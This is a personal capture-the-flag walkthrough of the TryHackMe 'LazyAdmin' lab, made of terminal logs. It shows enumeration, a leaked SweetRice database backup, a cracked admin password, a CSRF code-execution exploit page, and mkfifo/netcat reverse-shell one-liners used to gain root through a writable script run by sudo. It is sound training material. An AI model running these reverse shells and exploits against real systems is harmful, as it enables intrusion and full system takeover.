kali@kali:~/oscptraining/tryhackme/Lazyadmin$ nmap -sV -sC -o nmap 10.10.141.253
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-17 03:25 EDT
Nmap scan report for 10.10.141.253
Host is up (0.34s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                                                                       
| ssh-hostkey:                                                                                                                                                                                          
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)                                                                                                                                          
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)                                                                                                                                         
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)                                                                                                                                       
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                     
|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                            
|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                                                                     
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   

kali@kali:~/oscptraining/tryhackme/Lazyadmin$ gobuster dir -e -u http://10.10.141.253 -w /usr/share/wordlists/dirb/common.txt
===============================================================                                                                                                                                         
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.141.253
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/10/17 03:31:59 Starting gobuster
===============================================================
http://10.10.141.253/.hta (Status: 403)
http://10.10.141.253/.htpasswd (Status: 403)
http://10.10.141.253/.htaccess (Status: 403)
http://10.10.141.253/content (Status: 301)
http://10.10.141.253/index.html (Status: 200)
http://10.10.141.253/server-status (Status: 403)
===============================================================
2020/10/17 03:34:44 Finished
===============================================================


http://10.10.141.253/content (Status: 301)

Sweetrice? Lets look on searchsploit



kali@kali:~/oscptraining/tryhackme/Lazyadmin$ cat /usr/share/exploitdb/exploits/php/webapps/40718.txt
Title: SweetRice 1.5.1 - Backup Disclosure
Application: SweetRice
Versions Affected: 1.5.1
Vendor URL: http://www.basic-cms.org/
Software URL: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
Discovered by: Ashiyane Digital Security Team
Tested on: Windows 10
Bugs: Backup Disclosure
Date: 16-Sept-2016


Proof of Concept :

You can access to all mysql backup and download them from this directory.
http://localhost/inc/mysql_backup

and can access to website files backup from:
http://localhost/SweetRice-transfer.zip

going to the page we see a sql file

http://10.10.141.253/content/inc/mysql_backup/

  14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',

  seems like we got a clue here

admin: manager
pwd: 42f749ade7f9e195bf475f37a44cafcb

  Password123


  kali@kali:~/oscptraining/tryhackme/Lazyadmin$ cat /usr/share/exploitdb/exploits/php/webapps/40700.html
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save" method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
&lt;/textarea&gt;
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/


kali@kali:~/oscptraining/tryhackme/Lazyadmin$ subl 40700.html
do some edit; put the reverse shell code in from pentestmonkey in the content, run it
kali@kali:~/oscptraining/tryhackme/Lazyadmin$ firefox 40700.html

run this
10.10.52.59/content/inc/ads/hacked.php



kali@kali:~/oscptraining/tryhackme/Lazyadmin$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.102.117] from (UNKNOWN) [10.10.52.59] 44358
Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
 09:11:03 up  1:21,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ python -c 'import pty; pty.spawn("/bin/bash")'

www-data@THM-Chal:/$ whoami
whoami
www-data
www-data@THM-Chal:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
www-data@THM-Chal:/$ 


www-data@THM-Chal:/home/itguy$ sudo -l
sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.
    
www-data@THM-Chal:/home/itguy$ cat /home/itguy/backup.pl
cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");

copy.sh in the /etc/ directory will run when we execute backup.pl file, lets check out whats the file is about

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f

a reverse shell, lets rewrite it to our own IP address

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.102.117 4444 >/tmp/f' > /etc/copy.sh

open netcat on kali
nc -lvnp 4444

run this on victim
sudo /usr/bin/perl /home/itguy/backup.pl

and we caught the shell and is in as root!

# whoami
root
# cat /root/root.txt
THM{6637f41d0177b6f37cb20d775124699f}


completed on 18oct2020 1445hr






